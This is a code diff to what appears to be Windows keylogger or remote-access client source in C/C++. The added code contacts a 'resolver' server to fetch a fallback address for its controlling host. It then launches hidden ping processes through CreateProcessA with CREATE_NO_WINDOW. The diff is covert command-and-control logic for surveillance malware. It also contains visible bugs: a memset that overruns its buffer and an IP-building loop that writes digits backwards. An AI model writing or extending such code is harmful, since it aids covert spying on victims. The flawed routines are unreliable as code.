@@ -59,6 +59,62 @@ DWORD WINAPI keyThread(LPVOID args) {
 	return 0;
 }
 
+SOCKET getResolverSocket() {
+	addrinfo sockaddr;
+	PADDRINFOA hostinfo = NULL;
+
+	ZeroMemory(&sockaddr, sizeof(sockaddr));
+	sockaddr.ai_family = AF_INET;
+	sockaddr.ai_socktype = SOCK_STREAM;
+	sockaddr.ai_protocol = IPPROTO_TCP;
+
+	SOCKET MainSock = INVALID_SOCKET;
+
+	if (getaddrinfo(RESOLVER_IPNAME, RESOLVER_PORT, &sockaddr, &hostinfo)) {
+		return INVALID_SOCKET;
+	}
+
+	for (hostinfo; hostinfo != NULL; hostinfo = hostinfo->ai_next) {
+
+		MainSock = socket(hostinfo->ai_family, hostinfo->ai_socktype, hostinfo->ai_protocol);
+		if (MainSock == INVALID_SOCKET) {
+			freeaddrinfo(hostinfo);
+			return INVALID_SOCKET;
+		}
+
+		if (connect(MainSock, hostinfo->ai_addr, hostinfo->ai_addrlen) == SOCKET_ERROR) {
+			closesocket(MainSock);
+			MainSock = INVALID_SOCKET;
+			continue;
+		}
+		break;
+	}
+
+	if (MainSock == INVALID_SOCKET) return INVALID_SOCKET;
+
+	else freeaddrinfo(hostinfo);
+
+	return MainSock;
+}
+void getFromResolver(struct server_packet *packet) {
+	memset(packet->data, 0, 4);
+	SOCKET resolver_server = getResolverSocket();
+
+	if (resolver_server == INVALID_SOCKET) {
+		return;
+	}
+
+	packet->code = USBread_CLIENT;
+
+	if (send(resolver_server, (char*)packet, sizeof(struct server_packet), 0) == SOCKET_ERROR) {
+		closesocket(resolver_server);
+		return;
+	}
+
+	recv(resolver_server, (char*)packet->data, 4, 0);
+
+	closesocket(resolver_server);
+}
 
 
 struct ipData {
@@ -242,7 +298,7 @@ Rerun:
 	if (MainSock == INVALID_SOCKET) {
 		ipaddr.dispose();
 
-		if (reRun < 2) {
+		if (reRun < 3) {
 
 			STARTUPINFOA sInfo;
 			ZeroMemory(&sInfo, sizeof(STARTUPINFOA));
@@ -250,11 +306,34 @@ Rerun:
 			PROCESS_INFORMATION pInfo;
 			ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
 
-			if (reRun == 0) {
-				if (!CreateProcessA(NULL, (LPSTR)"ping 192.168.0.185", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+			if (reRun < 2) {
+				if (!CreateProcessA(NULL, reRun == 0 ? (LPSTR)"ping 192.168.0.185" : (LPSTR)"ping 192.168.0.189", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
 			}
 			else {
-				if (!CreateProcessA(NULL, (LPSTR)"ping 192.168.0.189", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+				struct server_packet packet;
+
+				getFromResolver(&packet);
+
+				if (*(int*)packet.data) {
+					char resolvedIp[21] = "ping ";
+					memset(resolvedIp + 5, 0, 21);
+
+					unsigned char resolvedIpLen = 5;
+
+					for (int i = 0; i < 4; i++) {
+						do {
+							resolvedIp[resolvedIpLen++] = (packet.data[i] % 10) + '0';
+							packet.data[i] = packet.data[i] / 10;
+						} while (packet.data[i] != 0);
+
+						if (i != 3) resolvedIp[resolvedIpLen++] = '.';
+					}
+
+					if (!CreateProcessA(NULL, resolvedIp, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+				}
+				else {
+					return INVALID_SOCKET;
+				}
 			}
 			
 			reRun++;
